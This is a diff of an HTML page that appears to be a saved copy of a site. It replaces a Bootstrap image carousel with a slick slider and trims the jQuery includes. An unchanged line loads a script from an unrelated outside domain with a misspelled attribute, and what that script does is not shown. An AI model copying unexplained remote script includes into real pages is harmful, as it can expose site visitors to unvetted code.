@@ -57,16 +57,13 @@
     <link href="./index_files/account.css" rel="stylesheet">
 
     <script src="./index_files/webfont.js" type="text/javascript" async=""></script>
-    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
-    <!-- JavaScript Bundle with Popper -->
+    <script type="text/javascript" src="./index_files/jquery-3.3.1.min.js"></script>
     <script src="../index_files/bootstrap.js" type="text/javascript"></script>
     <script tyle="text/javascript" src="https://theirmood.com/src/wdd/card.show.js?time=0001"></script>
-
     <!--[if lt IE 9]>
     <script type="text/javascript" src="/js/html5shiv.js?v=211222"></script> <![endif]-->
     <script type="text/javascript" src="./index_files/jquery.2.2.4.min.js"></script>
     <!--반드시 bootsrap - jquery-ui 사이에 위치-->
-    <script type="text/javascript" src="https://code.jquery.com/jquery-3.5.0.js"></script>
     <script type="text/javascript" src="./index_files/jquery-ui.1.12.min.js"></script>
     <script type="text/javascript" src="./index_files/jquery.lazyload.js"></script>
     <script type="text/javascript" src="./index_files/jquery-migrate-1.2.1.min.js"></script>
@@ -74,6 +71,7 @@
     <script type="text/javascript" src="./index_files/jquery.scrollbar.js" charset="utf-8"></script>
     <script type="text/javascript" src="./index_files/jquerymobile-swipeupdown.js"></script>
     <script type="text/javascript" src="./index_files/global.js" charset="utf-8"></script>
+    <script type="text/javascript" src="./index_files/slick.min.js"></script>
 
 
     <script src="./index_files/webfont.js"></script>
@@ -606,37 +604,48 @@
                 data-hei="337px" data-m-hei="248px">
                 <div class="preview"></div>
                 <div class="view ha-c">
-                    <div class="tb tbu" style="height: 337px;">
-                        <div class="row clearfix tb-c va-m" style="transform: none;">
-                            <div class="col-sm-12 column" style="height: auto;">
-                                <div id="carouselExampleIndicators" class="carousel slide" data-ride="carousel">
-                                    <ol class="carousel-indicators">
-                                        <li data-target="#carouselExampleIndicators" data-slide-to="0" class="active">
-                                        </li>
-                                        <li data-target="#carouselExampleIndicators" data-slide-to="1"></li>
-                                    </ol>
-                                    <div class="carousel-inner">
-                                        <div class="item active">
-                                            <img src="../images/carousel1.jpg" alt="First slide">
-                                        </div>
-                                        <div class="item">
-                                            <img src="../images/carousel2.jpg" alt="Second slide">
+                    <div class="slide_wrap main_slide">
+                        <div class="slick-list draggable">
+                            <div class="slick-track" style="opacity: 1; width: 380px;">
+                                <div class="slick-slide" data-slick-index="0" aria-hidden="true" role="tabpanel"
+                                    id="slick-slide00" style="position: relative;" tabindex="-1"
+                                    aria-describedby="slick-slide-control00">
+                                    <div class="slide" style="width: 100%; display: inline-block;">
+                                        <div class="img">
+                                            <img src="../images/carousel1.jpg">
                                         </div>
                                     </div>
-                                    <a class="carousel-control left" href="#carouselExampleIndicators" role="button"
-                                        data-slide="prev">
-                                        <span class="fa fa-chevron-left" aria-hidden="true"></span>
-                                        <span class="sr-only">Previous</span>
-                                    </a>
-                                    <a class="carousel-control right" href="#carouselExampleIndicators" role="button"
-                                        data-slide="next">
-                                        <span class="fa fa-chevron-right" aria-hidden="true"></span>
-                                        <span class="sr-only">Next</span>
-                                    </a>
+                                </div>
+                                <div class="slick-slide" data-slick-index="1" aria-hidden="true" role="tabpanel"
+                                    id="slick-slide01" style="position: relative;" tabindex="-1"
+                                    aria-describedby="slick-slide-control01">
+                                    <div class="slide" style="width: 100%; display: inline-block;">
+                                        <div class="img">
+                                            <img src="../images/carousel2.jpg">
+                                        </div>
+                                    </div>
                                 </div>
                             </div>
                         </div>
+                        <ul class="slick-dots" role="tablist">
+                            <li class="" role="presentation"><button type="button" role="tab" id="slick-slide-control00"
+                                    aria-controls="slick-slide00" aria-label="1 of 2" tabindex="-1">1</button></li>
+                            <li role="presentation" class=""><button type="button" role="tab" id="slick-slide-control01"
+                                    aria-controls="slick-slide01" aria-label="2 of 2" tabindex="-1">2</button></li>
+                        </ul>
                     </div>
+                    <script>
+                        $(document).ready(function () {
+                            $(".slick-track").slick({
+                                autoplay: true,
+                                autoplaySpeed: 6000,
+                                fade: true,
+                                infinite: true,
+                                arrows: false,
+                                dots: true
+                            });
+                        });
+                    </script>
                 </div>
                 <style class="mobile-frm">
                     @media (max-width: 767px) {
